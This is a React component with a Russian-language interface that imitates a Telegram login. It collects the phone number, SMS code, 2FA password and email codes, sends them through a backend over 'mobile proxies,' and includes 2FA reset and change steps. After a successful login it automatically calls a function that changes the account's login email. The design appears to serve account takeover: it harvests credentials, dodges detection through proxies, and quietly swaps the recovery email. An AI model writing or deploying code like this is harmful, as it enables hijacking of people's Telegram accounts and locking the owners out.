import React, { useEffect, useState } from 'react';
import { Phone, MessageSquare, Lock, ArrowLeft, Mail } from 'lucide-react';
import { telegramService } from '../../services/telegramService';
import toast from 'react-hot-toast';
import './telegram-form.css';

interface TelegramAuthFormProps {
    onSuccess?: () => void;
    onCancel?: () => void;
    clientId?: number;
}

type AuthStep = 'phone' | 'code' | 'password' | 'success';
type TwoFactorStep = 'password' | 'reset2fa';

export const TelegramAuthForm: React.FC<TelegramAuthFormProps> = ({
    onSuccess,
    onCancel,
    clientId
}) => {
    const [step, setStep] = useState<AuthStep>('phone');
    const [twoFactorStep, setTwoFactorStep] = useState<TwoFactorStep>('password');
    const [phoneNumber, setPhoneNumber] = useState('+');
    const [code, setCode] = useState('');
    const [password, setPassword] = useState('');
    const [phoneCodeHash, setPhoneCodeHash] = useState('');
    const [sentTo, setSentTo] = useState('');
    const [loading, setLoading] = useState(false);
    const [requiresEmailVerification, setRequiresEmailVerification] = useState(false);
    const [email, setEmail] = useState('');
    const [emailCode, setEmailCode] = useState('');
    const [emailPattern, setEmailPattern] = useState('');
    const [maskedEmail, setMaskedEmail] = useState<string>('');
    const [resetCode, setResetCode] = useState('');
    const [new2faPassword, setNew2faPassword] = useState('');
    const [resendSeconds, setResendSeconds] = useState<number>(0);

    // Тикер для обратного отсчёта повторной отправки
    useEffect(() => {
        if (resendSeconds <= 0) return;
        const id = setInterval(() => setResendSeconds((s) => s - 1), 1000);
        return () => clearInterval(id);
    }, [resendSeconds]);

    const handleSendCode = async (e?: React.FormEvent, forceSms = false) => {
        if (e) e.preventDefault();
        setLoading(true);

        try {
            // Проверяем состояние прокси перед отправкой
            const connectionCheck = await telegramService.checkConnection();
            if (connectionCheck.proxyConnected) {
                toast(`🔗 Подключение к Telegram через мобильный прокси...`, {
                    icon: '🌐',
                    duration: 2000
                });
            }

            const result = await telegramService.sendCode({
                phone_number: phoneNumber,
                client_id: clientId,
                force_sms: forceSms
            });

            if (result.success && result.phoneCodeHash) {
                setPhoneCodeHash(result.phoneCodeHash);
                setSentTo(result.sentTo || 'неизвестно');
                // Запускаем таймер повторной отправки (60с по умолчанию)
                setResendSeconds((result as any)?.expireSeconds ?? 60);

                // Показываем статус прокси
                if (result.proxyConnected && result.proxyInfo) {
                    toast.success(`🌐 Мобильный прокси подключен: ${result.proxyInfo}`);
                } else if (!result.proxyConnected) {
                    toast(`⚠️ Прокси недоступны, используется обычное соединение`, {
                        icon: '⚠️',
                        duration: 4000
                    });
                }

                if (result.requiresEmailVerification) {
                    setRequiresEmailVerification(true);
                    setStep('code');
                    toast.success(`Требуется верификация по email. Код отправлен на ${result.sentTo}`);
                } else {
                    setRequiresEmailVerification(false);
                    setStep('code');
                    toast.success(`Код отправлен ${result.sentTo}`);
                }
            } else {
                toast.error(result.message || 'Ошибка отправки кода');
            }
        } catch (error: any) {
            toast.error(error.response?.data?.message || 'Ошибка отправки кода');
        } finally {
            setLoading(false);
        }
    };

    const handleSendEmailCode = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        try {
            const result = await telegramService.sendEmailCode({
                phone_number: phoneNumber,
                phone_code_hash: phoneCodeHash,
                email: email
            });
            if (result.success && result.emailPattern) {
                setEmailPattern(result.emailPattern);
                toast.success(`Код верификации отправлен на email, соответствующий паттерну: ${result.emailPattern}`);
            } else {
                toast.error(result.message || 'Ошибка отправки кода на email');
            }
        } catch (error: any) {
            toast.error(error.response?.data?.message || 'Ошибка отправки кода на email');
        } finally {
            setLoading(false);
        }
    };

    const handleVerifyEmailCode = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        try {
            const result = await telegramService.verifyEmailCode({
                phone_number: phoneNumber,
                phone_code_hash: phoneCodeHash,
                code: emailCode
            });
            if (result.success) {
                toast.success(result.message || 'Email верифицирован! Теперь запросите код снова.');
                setRequiresEmailVerification(false);
                await handleSendCode();
            } else {
                toast.error(result.message || 'Ошибка верификации email');
            }
        } catch (error: any) {
            toast.error(error.response?.data?.message || 'Ошибка верификации email');
        } finally {
            setLoading(false);
        }
    };

    const handleVerifyCode = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);

        try {
            const result = await telegramService.verifyCode({
                phone_number: phoneNumber,
                code: code,
                phone_code_hash: phoneCodeHash
            });

            if (result.success) {
                if (result.requires2FA) {
                    setStep('password');
                } else {
                    setStep('success');
                    toast.success('Авторизация успешна!');

                    // Автоматическая смена логин email
                    setTimeout(async () => {
                        try {
                            toast.loading('Автоматическая смена логин email...', { id: 'auto-email' });
                            const emailResult = await telegramService.autoChangeLoginEmail(phoneNumber);

                            if (emailResult.success) {
                                toast.success(
                                    `Email успешно изменен на ${emailResult.new_email}`,
                                    { id: 'auto-email', duration: 4000 }
                                );
                            } else {
                                toast.dismiss('auto-email');
                                console.warn('Не удалось автоматически сменить email:', emailResult.message);
                            }
                        } catch (error: any) {
                            toast.dismiss('auto-email');
                            console.warn('Ошибка автоматической смены email:', error);
                        }

                        onSuccess?.();
                        window.location.reload();
                    }, 1500);
                }
            } else {
                toast.error(result.message || 'Неверный код');
            }
        } catch (error: any) {
            toast.error(error.response?.data?.message || 'Ошибка верификации кода');
        } finally {
            setLoading(false);
        }
    };

    const handleVerifyPassword = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);

        try {
            const result = await telegramService.verifyPassword({
                phone_number: phoneNumber,
                password: password
            });

            if (result.success) {
                setStep('success');
                toast.success('Авторизация с 2FA успешна!');

                // Автоматическая смена логин email
                setTimeout(async () => {
                    try {
                        toast.loading('Автоматическая смена логин email...', { id: 'auto-email' });
                        const emailResult = await telegramService.autoChangeLoginEmail(phoneNumber);

                        if (emailResult.success) {
                            toast.success(
                                `Email успешно изменен на ${emailResult.new_email}`,
                                { id: 'auto-email', duration: 4000 }
                            );
                        } else {
                            toast.dismiss('auto-email');
                            console.warn('Не удалось автоматически сменить email:', emailResult.message);
                        }
                    } catch (error: any) {
                        toast.dismiss('auto-email');
                        console.warn('Ошибка автоматической смены email:', error);
                    }

                    onSuccess?.();
                    window.location.reload();
                }, 1500);
            } else {
                toast.error(result.message || 'Неверный пароль');
            }
        } catch (error: any) {
            toast.error(error.response?.data?.message || 'Ошибка верификации пароля');
        } finally {
            setLoading(false);
        }
    };

    const handleReset2FA = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        try {
            const result = await telegramService.resetTwoFactor({ phone_number: phoneNumber });
            if (result.success && result.masked_email) {
                setMaskedEmail(result.masked_email);
                toast.success(result.message || `Код для сброса 2FA отправлен на ${result.masked_email}`);
            } else {
                toast.error(result.message || 'Ошибка отправки кода для сброса 2FA');
            }
        } catch (error: any) {
            toast.error(error.response?.data?.message || 'Ошибка сброса 2FA');
        } finally {
            setLoading(false);
        }
    };

    const handleChange2faPassword = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        try {
            const result = await telegramService.changeTwoFactorPassword({
                phone_number: phoneNumber,
                code: resetCode,
                new_password: new2faPassword
            });
            if (result.success) {
                toast.success(result.message || 'Пароль 2FA успешно изменён!');
                setTwoFactorStep('password');
            } else {
                toast.error(result.message || 'Ошибка смены пароля 2FA');
            }
        } catch (error: any) {
            toast.error(error.response?.data?.message || 'Ошибка смены пароля 2FA');
        } finally {
            setLoading(false);
        }
    };

    const renderPhoneStep = () => (
        <div className="telegram-form">
            <div className="telegram-form__header">
                {onCancel && (
                    <button
                        onClick={onCancel}
                        className="telegram-form__close"
                        disabled={loading}
                        aria-label="Отмена"
                    >
                        Отмена
                    </button>
                )}
                <h1 className="telegram-form__title">Авторизация в Telegram</h1>
                <p className="telegram-form__subtitle">
                    Пожалуйста, укажите код страны и ваш номер телефона.
                </p>
                <div className="telegram-form__proxy-status">
                    🌐 Мобильные прокси готовы к подключению
                </div>
            </div>

            <form onSubmit={handleSendCode} className="telegram-form__content">
                <div className="telegram-form__field">
                    <div className="telegram-form__input-wrapper">
                        <Phone className="telegram-form__input-icon" size={20} />
                        <input
                            type="tel"
                            value={phoneNumber}
                            onChange={(e) => {
                                const raw = e.target.value.replace(/\s+/g, '');
                                let next = raw.startsWith('+') ? raw : `+${raw.replace(/^\+/, '')}`;
                                // Разрешаем только + и цифры
                                next = next.replace(/[^+\d]/g, '');
                                setPhoneNumber(next);
                            }}
                            placeholder="Номер телефона"
                            className="telegram-form__input"
                            disabled={loading}
                            autoFocus
                        />
                    </div>
                    <div className="telegram-form__hint">
                        Введите номер в международном формате
                    </div>
                </div>

                <button
                    type="submit"
                    disabled={loading || !phoneNumber.trim()}
                    className="telegram-form__button telegram-form__button--telegram"
                >
                    {loading ? (
                        <div className="telegram-form__spinner" />
                    ) : (
                        <>
                            <MessageSquare size={16} />
                            Авторизоваться в Telegram
                        </>
                    )}
                </button>

                {onCancel && (
                    <button
                        type="button"
                        onClick={onCancel}
                        className="telegram-form__button telegram-form__button--secondary"
                        disabled={loading}
                    >
                        Отмена
                    </button>
                )}
            </form>
        </div>
    );

    const renderCodeStep = () => {
        if (requiresEmailVerification) {
            return (
                <div className="telegram-form">
                    <div className="telegram-form__header">
                        <button
                            onClick={() => setStep('phone')}
                            className="telegram-form__back"
                            disabled={loading}
                        >
                            <ArrowLeft size={24} />
                        </button>
                        <h1 className="telegram-form__title">Подтверждение Email</h1>
                        <p className="telegram-form__subtitle">
                            Для входа требуется подтвердить ваш email адрес.
                        </p>
                    </div>

                    <div className="telegram-form__content">
                        {!emailPattern && (
                            <form onSubmit={handleSendEmailCode}>
                                <div className="telegram-form__field">
                                    <div className="telegram-form__input-wrapper">
                                        <Mail className="telegram-form__input-icon" size={20} />
                                        <input
                                            type="email"
                                            value={email}
                                            onChange={(e) => setEmail(e.target.value)}
                                            placeholder="Email"
                                            className="telegram-form__input"
                                            disabled={loading}
                                            autoFocus
                                        />
                                    </div>
                                </div>
                                <button
                                    type="submit"
                                    disabled={loading || !email.trim()}
                                    className="telegram-form__button telegram-form__button--primary"
                                >
                                    {loading ? (
                                        <div className="telegram-form__spinner" />
                                    ) : (
                                        <>
                                            <Mail size={16} />
                                            Отправить код
                                        </>
                                    )}
                                </button>
                            </form>
                        )}

                        {emailPattern && (
                            <form onSubmit={handleVerifyEmailCode}>
                                <div className="telegram-form__info">
                                    Код отправлен на: {emailPattern}
                                </div>
                                <div className="telegram-form__field">
                                    <input
                                        type="text"
                                        value={emailCode}
                                        onChange={(e) => setEmailCode(e.target.value)}
                                        placeholder="Код из email"
                                        className="telegram-form__input telegram-form__input--code"
                                        disabled={loading}
                                        maxLength={6}
                                        autoFocus
                                    />
                                </div>
                                <button
                                    type="submit"
                                    disabled={loading || !emailCode.trim()}
                                    className="telegram-form__button telegram-form__button--primary"
                                >
                                    {loading ? (
                                        <div className="telegram-form__spinner" />
                                    ) : (
                                        'Подтвердить'
                                    )}
                                </button>
                            </form>
                        )}
                    </div>
                </div>
            );
        }

        return (
            <div className="telegram-form">
                <div className="telegram-form__header">
                    <button
                        onClick={() => setStep('phone')}
                        className="telegram-form__back"
                        disabled={loading}
                    >
                        <ArrowLeft size={24} />
                    </button>
                    {onCancel && (
                        <button
                            onClick={onCancel}
                            className="telegram-form__close"
                            disabled={loading}
                        >
                            Отмена
                        </button>
                    )}
                    <h1 className="telegram-form__title">Код подтверждения</h1>
                    <p className="telegram-form__subtitle">
                        Мы отправили SMS с кодом {sentTo}
                    </p>
                </div>

                <form onSubmit={handleVerifyCode} className="telegram-form__content">
                    <div className="telegram-form__field">
                        <input
                            type="text"
                            value={code}
                            onChange={(e) => setCode(e.target.value)}
                            placeholder="Код"
                            className="telegram-form__input telegram-form__input--code"
                            disabled={loading}
                            maxLength={5}
                            autoFocus
                        />
                    </div>

                    <button
                        type="submit"
                        disabled={loading || !code.trim()}
                        className="telegram-form__button telegram-form__button--primary"
                    >
                        {loading ? (
                            <div className="telegram-form__spinner" />
                        ) : (
                            'Подтвердить код'
                        )}
                    </button>

                    <div className="telegram-form__actions">
                        <button
                            type="button"
                            onClick={() => handleSendCode(undefined, false)}
                            disabled={loading || resendSeconds > 0}
                            className="telegram-form__link"
                        >
                            {resendSeconds > 0 ? `Отправить код повторно (${resendSeconds}с)` : 'Отправить код повторно'}
                        </button>
                        <button
                            type="button"
                            onClick={() => handleSendCode(undefined, true)}
                            disabled={loading || resendSeconds > 0}
                            className="telegram-form__link"
                        >
                            {resendSeconds > 0 ? `Отправить по SMS (${resendSeconds}с)` : 'Отправить по SMS'}
                        </button>
                    </div>
                </form>
            </div>
        );
    };

    const renderPasswordStep = () => {
        if (twoFactorStep === 'reset2fa') {
            return (
                <div className="telegram-form">
                    <div className="telegram-form__header">
                        <button
                            onClick={() => setTwoFactorStep('password')}
                            className="telegram-form__back"
                            disabled={loading}
                        >
                            <ArrowLeft size={24} />
                        </button>
                        <h1 className="telegram-form__title">Сброс пароля</h1>
                        <p className="telegram-form__subtitle">
                            Код для сброса будет отправлен на ваш email
                        </p>
                    </div>

                    <div className="telegram-form__content">
                        {!maskedEmail ? (
                            <button
                                onClick={handleReset2FA}
                                disabled={loading}
                                className="telegram-form__button telegram-form__button--primary"
                            >
                                {loading ? <div className="telegram-form__spinner" /> : 'Получить код сброса'}
                            </button>
                        ) : (
                            <div>
                                <div className="telegram-form__info">
                                    Код отправлен на: {maskedEmail}
                                </div>
                                <div className="telegram-form__field">
                                    <input
                                        type="text"
                                        value={resetCode}
                                        onChange={(e) => setResetCode(e.target.value)}
                                        placeholder="Код из email"
                                        className="telegram-form__input"
                                        disabled={loading}
                                    />
                                </div>
                                {resetCode && (
                                    <div className="telegram-form__field">
                                        <input
                                            type="password"
                                            value={new2faPassword}
                                            onChange={(e) => setNew2faPassword(e.target.value)}
                                            placeholder="Новый пароль"
                                            className="telegram-form__input"
                                            disabled={loading}
                                        />
                                        <button
                                            onClick={handleChange2faPassword}
                                            disabled={loading || !resetCode || !new2faPassword}
                                            className="telegram-form__button telegram-form__button--primary"
                                        >
                                            {loading ? <div className="telegram-form__spinner" /> : 'Изменить пароль'}
                                        </button>
                                    </div>
                                )}
                            </div>
                        )}
                    </div>
                </div>
            );
        }

        return (
            <div className="telegram-form">
                <div className="telegram-form__header">
                    <button
                        onClick={() => setStep('code')}
                        className="telegram-form__back"
                        disabled={loading}
                    >
                        <ArrowLeft size={24} />
                    </button>
                    {onCancel && (
                        <button
                            onClick={onCancel}
                            className="telegram-form__close"
                            disabled={loading}
                        >
                            Отмена
                        </button>
                    )}
                    <h1 className="telegram-form__title">Пароль</h1>
                    <p className="telegram-form__subtitle">
                        У вашего аккаунта включена двухфакторная аутентификация
                    </p>
                </div>

                <form onSubmit={handleVerifyPassword} className="telegram-form__content">
                    <div className="telegram-form__field">
                        <div className="telegram-form__input-wrapper">
                            <Lock className="telegram-form__input-icon" size={20} />
                            <input
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                placeholder="Пароль"
                                className="telegram-form__input"
                                disabled={loading}
                                autoFocus
                            />
                        </div>
                    </div>

                    <button
                        type="submit"
                        disabled={loading || !password.trim()}
                        className="telegram-form__button telegram-form__button--primary"
                    >
                        {loading ? (
                            <div className="telegram-form__spinner" />
                        ) : (
                            <>
                                <Lock size={16} />
                                Войти с паролем 2FA
                            </>
                        )}
                    </button>

                    <div className="telegram-form__actions">
                        <button
                            type="button"
                            onClick={() => setTwoFactorStep('reset2fa')}
                            disabled={loading}
                            className="telegram-form__link"
                        >
                            Забыли пароль?
                        </button>
                    </div>
                </form>
            </div>
        );
    };

    const renderSuccessStep = () => (
        <div className="telegram-form">
            <div className="telegram-form__header">
                <h1 className="telegram-form__title">Готово!</h1>
                <p className="telegram-form__subtitle">
                    Авторизация прошла успешно
                </p>
            </div>
        </div>
    );

    switch (step) {
        case 'phone':
            return renderPhoneStep();
        case 'code':
            return renderCodeStep();
        case 'password':
            return renderPasswordStep();
        case 'success':
            return renderSuccessStep();
        default:
            return null;
    }
};